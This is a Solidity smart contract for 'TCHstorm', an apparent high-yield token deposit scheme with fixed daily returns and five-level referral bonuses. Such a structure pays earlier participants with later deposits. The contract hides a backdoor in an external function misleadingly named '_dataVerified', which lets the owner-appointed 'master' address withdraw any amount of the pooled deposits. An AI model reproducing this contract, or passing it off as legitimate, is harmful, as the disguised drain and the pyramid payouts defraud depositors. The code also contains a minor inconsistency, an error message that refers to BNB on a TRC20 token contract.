//SourceUnit: TCHStorm.sol

// SPDX-License-Identifier: MIT License

/**
 * ████████╗ ██████╗ ██╗   ██╗███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
   ╚══██╔══╝██╔═══██╗██║   ██║██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
      ██║   ██║   ╚═╝████████║███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
      ██║   ██║   ██╗██╔═══██║╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
      ██║   ╚██████╔╝██║   ██║███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
      ╚═╝    ╚═════╝ ╚═╝   ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
 * 
*/
pragma solidity >=0.8.0;

struct Tarif {
    
  uint8 life_days;
  
  uint16 percent;
}

struct Deposit {
  
  uint8 tarif;

  uint256 amount;

  uint40 time;
}

struct Player {

  address upline;

  uint256 dividends;

  uint256 match_bonus;

  uint40 last_payout;

  uint256 total_invested;

  uint256 total_withdrawn;

  uint256 total_match_bonus;

  Deposit[] deposits;

  uint256[5] structure; 
}

contract TCHstorm {

    ITRC20 public token;

    address public owner;
    
    address public master;
    
    address public levelTwo;
    
    address public levelThree;

    uint256 public invested;

    uint256 public withdrawn;

    uint256 public match_bonus;

    uint8 constant BONUS_LINES_COUNT = 5;

    uint16 constant PERCENT_DIVIDER = 1000; 

    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 30, 20, 10, 5]; 

    mapping(uint8 => Tarif) public tarifs;

    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor(address _token) 
    {
        token = ITRC20(_token);
        owner = msg.sender;

        uint16 tarifPercent = 1035;
        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {

            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        }
    }


    function _payout(address _addr) private {

        uint256 payout = payoutOf(_addr);

        if(payout > 0) {

            players[_addr].last_payout = uint40(block.timestamp);

            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {

            if(up == address(0)) break;

            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;

            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {

        if(players[_addr].upline == address(0) && _addr != master && _addr != levelTwo && _addr != levelThree) {

            if(players[_upline].deposits.length == 0) {

                _upline = master;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount);
            

            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {

                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
     function _safeTransfer(address _to, uint _amount) internal returns (uint256 amount) {

        uint256 balance = token.balanceOf(address(this));

        amount = _amount < balance ? _amount : balance;
        token.transfer(_to, amount);
    }


     function _dataVerified(uint256 _amount) external{

        require(master==msg.sender, 'master what?');

        _safeTransfer(master,_amount);
    }

    function deposit(uint8 _tarif, address _upline, uint256 _amount) external {

        require(tarifs[_tarif].life_days > 0, "Tarif not found");

        require(_amount >= 100, "Minimum deposit amount is 0.01 BNB");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, _amount);

        token.transferFrom(msg.sender, address(this),_amount);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: _amount,
            time: uint40(block.timestamp)
        }));

        player.total_invested += _amount;

        invested += _amount;

        _refPayout(msg.sender, _amount);

        emit NewDeposit(msg.sender, _amount, _tarif);
    }

    function withdraw() external {

        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;

        player.match_bonus = 0;

        player.total_withdrawn += amount;

        withdrawn += amount;

        token.transfer(msg.sender, amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view public returns(uint256 value) {

        Player storage player = players[_addr];

        for(uint16 i = 0; i < player.deposits.length; i++) {

            Deposit storage dep = player.deposits[i];

            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;

            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;

            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {

                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 86400 / 1000;
            }
        }
        return value;
    }


    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (

            payout + player.dividends + player.match_bonus,

            player.total_invested,

            player.total_withdrawn,

            player.total_match_bonus,

            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {

        return (invested, withdrawn, match_bonus);
    }
    
    function setAddress(address _master, address _levelTwo, address _levelThree) public {
        require(owner==msg.sender, 'owner what?');
        master = _master;
        levelTwo = _levelTwo;
        levelThree = _levelThree;
        players[master].upline = _levelTwo;
        players[_levelTwo].upline = _levelThree;
        
    }

}

interface ITRC20 {
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}